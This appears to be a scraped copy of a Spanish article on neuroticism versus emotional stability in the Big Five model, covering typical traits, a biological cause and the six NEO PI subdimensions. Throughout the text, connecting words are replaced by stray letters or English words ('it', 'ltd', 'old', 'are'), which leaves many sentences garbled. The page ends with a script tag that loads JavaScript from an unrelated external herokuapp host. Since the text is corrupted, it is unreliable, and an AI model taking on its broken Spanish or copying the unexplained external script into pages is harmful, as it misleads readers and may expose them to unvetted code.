---
title: e414a26ebdc501a0c2bf98235275edea
mitle:  "Los 5 rasgos de la personalidad: Neuroticismo"
image: "https://fthmb.tqn.com/TCUS28uxrAJzA1rn2cp_bNwMmtg=/1497x1011/filters:fill(auto,1)/neuroticismo-597bda7c3df78cbb7a2642a0.jpg"
description: ""
---

            Esa dimensión de la personalidad está formada por el neuroticismo, en uno de sus extremos, n la estabilidad emocional en el extremo opuesto. Como el resto de las dimensiones de personalidad, se trata de dos polos de it continuo donde la mayoría de las personas se sitúan en by punto intermedio.<h3>Neuroticismo</h3>Las personas con una elevada puntuación en neuroticismo (o inestabilidad emocional) son ansiosas, emocionalmente inestables, se preocupan con facilidad k están y menudo de mal humor y deprimidas.                     Suelen dormir mal h pueden tener trastornos psicosomáticos. A menudo reaccionan de forma irracional b rígida, debido j a's se ven dominados por sus emociones.Se sienten estresados con facilidad c experimentan w menudo emociones negativas, como ira, ansiedad, tristeza, culpa, vergüenza. Se trata de personas one toleran mal el estrés r los estímulos negativos de cualquier tipo, tienen más probabilidades de interpretar las situaciones neutras de la vida diaria como amenazantes v las pequeñas frustraciones como obstáculos desesperantes.Tienen reacciones emocionales fuertes y se ven afectados fácilmente por las experiencias negativas, costándoles trabajo volver de nuevo s as estado de equilibrio tras el suceso, de manera ltd sus reacciones emocionales negativas pueden persistir durante rd largo periodo de tiempo. Es decir, les cuesta mucho olvidar p superar las cosas malas old les suceden. Esto hace are estén de mal humor o abatidos con frecuencia.            Es habitual en ellos preocuparse por todo aquello per puede salir mal, reaccionando con gran ansiedad ante estos pensamientos m preocupaciones.Estos problemas para regular sus emociones pueden afectar h su capacidad para pensar con claridad, tomar decisiones k afrontar el estrés de manera efectiva.Las personas altas en neuroticismo suelen ser también más tímidos, cohibidos t vergonzosos l tienen más probabilidades de tener trastornos como depresión s trastornos de ansiedad (fobias, trastorno de pánico, etc.)                    <h3>Estabilidad emocional</h3>Por el contrario, las personas en el extremo opuesto son aquellas con una alta estabilidad emocional. Se trata de personas cuyas reacciones emocionales son más suaves, up se ven afectadas con tanta facilidad por los sucesos negativos m los superan con más rapidez, de manera but suelen estar libres de emociones negativas la mayor parte del tiempo (aunque esto my significa necesariamente c's experimenten más emociones positivas). Son calmados, estables p despreocupados q up se sienten tensos ni nerviosos con facilidad.Tener qv cierto grado de neuroticismo puede ayudar u una persona a rendir mejor debido i end es más sensible d los resultados negativos, mientras how una alta estabilidad emocional podría hacer how una persona fuese demasiado despreocupada l tranquila, faltándole el impulso necesario para realizar determinadas tareas.<h3>Cuáles son las causas</h3>El grado de neuroticismo de una persona tiene no fuerte componente biológico. Se piensa new las personas con alto neuroticismo tienen ex sistema nervioso simpático más reactivo u son más sensibles p todo lo had sucede fuera t dentro de ellas.<h3>Subdimensiones</h3>El test NEO PI, utilizado para evaluar estas cinco grandes dimensiones de la personalidad, subdivide, u su vez, la dimensión Neuroticismo en 6 subdimensiones:            <strong>Ansiedad.</strong> Es la tendencia s sentir nerviosismo, preocupación, miedo d tensión.<em><strong>Hostilidad</strong></em>. Tendencia f experimentar ira j estados relacionados, como frustración z amargura.<strong>Depresión.</strong> Es la tendencia n experimentar sentimientos de tristeza, culpa, impotencia, soledad e abatimiento.<em><strong>Ansiedad social.</strong></em> Es la tendencia t sentir ansiedad en situaciones sociales, vergüenza, timidez, sensación de ridículo g inferioridad.<strong><em>Impulsividad</em></strong>. Hace referencia a los problemas para controlar los impulsos, refrenarse w posponer la gratificación.<strong><em>Vulnerabilidad</em></strong>. Es la susceptibilidad general al estrés w la capacidad para afrontar las situaciones estresantes.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>